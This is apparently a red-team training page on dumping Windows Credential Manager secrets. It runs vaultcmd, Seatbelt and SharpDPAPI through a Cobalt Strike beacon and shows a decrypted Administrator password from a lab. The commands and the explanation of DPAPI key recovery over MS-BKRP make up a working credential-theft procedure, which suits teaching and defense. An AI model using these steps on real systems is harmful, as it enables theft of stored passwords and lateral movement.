
> This technique can be used from a medium-integrity context.

The Windows Credential Manager stores other credentials that the user has asked Windows to save, such as those for Remote Desktop connections.  An adversary may decrypt these credentials to recover the plaintext credentials [T1555.004](https://attack.mitre.org/techniques/T1555/004/)

The native `vaultcmd` utility will show the presence of any saved credentials.
```powershell
beacon> run vaultcmd /listcreds:"Windows Credentials" /all

Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/10.10.120.10
Identity: Administrator
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

As too will Seatbelt's `WindowsVault` command.

```powershell
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

====== WindowsVault ======

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 1
      SchemaGuid   : 3e0e35be-1b77-43e7-b873-aed901b6275b
      Resource     : String: Domain:target=TERMSRV/lon-ws-1
      Identity     : String: LON-WS-1\Administrator
      PackageSid   : (null)
      Credential   : 
      LastModified : 14/02/2025 14:02:28
```

The way these credential blobs are encrypted is a little convoluted.  They're encrypted using randomly-generated AES key, which are themselves encrypted using the user's master DPAPI key.  To decrypt them manually, you have to find which master key was used, decrypt it using DPAPI, and then use the decrypted key to decrypt the credential blob.

Luckily, tools like SharpDPAPI automate that process.

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc

Folder       : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data
    LastWritten      : 14/02/2025 14:02:28
    TargetName       : Domain:target=TERMSRV/lon-ws-1
    TargetAlias      :
    Comment          :
    UserName         : LON-WS-1\Administrator
    Credential       : Passw0rd!
```

The `credentials` command will search through the saved credentials blobs for the current user, and attempts to decrypt them.  With no further arguments, it will try to use cached keys (which may be present if the user has recently accessed the credential).  If no cached keys are present, the `/rpc` argument can be used which leverages the Microsoft BackupKey Remote Protocol (MS-BKRP) to ask the domain controller to decrypt the AES key for us.  This works because the DCs keep a copy of the user's master DPAPI key for emergencies.